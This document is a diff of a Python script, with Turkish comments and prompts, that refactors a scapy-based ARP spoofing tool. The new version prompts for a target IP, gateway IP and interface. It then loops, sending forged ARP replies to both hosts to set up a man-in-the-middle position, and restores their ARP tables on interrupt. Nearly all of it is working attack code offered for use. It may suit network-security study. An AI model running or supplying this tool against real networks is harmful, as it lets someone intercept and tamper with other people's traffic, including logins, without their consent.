@@ -2,40 +2,45 @@ from scapy.all import ARP, Ether, send, srp
 import time
 import sys
 
-# Hedef IP ve ağ geçidi IP'sini belirle
-target_ip = "10.0.2.7"        # Hedef cihazın IP'si (örneğin öğrencinin makinesi)
-gateway_ip = "10.0.2.1"       # Ağ geçidinin IP'si (modemin IP'si)
+def get_mac(ip, interface):
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    answered_list = srp(arp_request, iface=interface, timeout=2, verbose=False)[0]
+    
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        print(f"[!] {ip} için ARP isteğine yanıt alınamadı.")
+        sys.exit(1)
 
-# MAC adresini öğrenme fonksiyonu
-def get_mac(ip):
-    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
-    answered_list = srp(arp_request, timeout=2, verbose=False)[0]
-    return answered_list[0][1].hwsrc
-
-# ARP spoofing paketi gönderme fonksiyonu
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
+def spoof(target_ip, spoof_ip, interface):
+    target_mac = get_mac(target_ip, interface)
     arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(arp_response, verbose=False)
+    send(arp_response, iface=interface, verbose=False)
 
-# ARP tablolarını düzeltme fonksiyonu
-def restore(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
+def restore(target_ip, gateway_ip, interface):
+    target_mac = get_mac(target_ip, interface)
+    gateway_mac = get_mac(gateway_ip, interface)
     arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
-    send(arp_response, verbose=False)
+    send(arp_response, iface=interface, verbose=False)
     print("[+] ARP Tabloları Düzeltildi")
 
-try:
-    print("[*] MITM Saldırısı Başlıyor... (CTRL+C ile durdurabilirsiniz)")
-    while True:
-        # Hedef cihazı ağ geçidine yönlendir
-        spoof(target_ip, gateway_ip)
-        # Ağ geçidini hedef cihaza yönlendir
-        spoof(gateway_ip, target_ip)
-        time.sleep(2)  # 2 saniyede bir paket gönder
-except KeyboardInterrupt:
-    print("\n[-] Saldırı Durduruluyor...")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
-    sys.exit(0)
+def main():
+    # Kullanıcıdan bilgileri alalım
+    target_ip = input("[?] Hedef IP adresini girin: ")
+    gateway_ip = input("[?] Ağ geçidi (gateway) IP adresini girin: ")
+    interface = input("[?] Ağ arayüzünü girin (örneğin, eth0 veya wlan0): ")
+
+    try:
+        print("[*] MITM Saldırısı Başlıyor... (CTRL+C ile durdurabilirsiniz)")
+        while True:
+            spoof(target_ip, gateway_ip, interface)
+            spoof(gateway_ip, target_ip, interface)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[-] Saldırı Durduruluyor...")
+        restore(target_ip, gateway_ip, interface)
+        restore(gateway_ip, target_ip, interface)
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
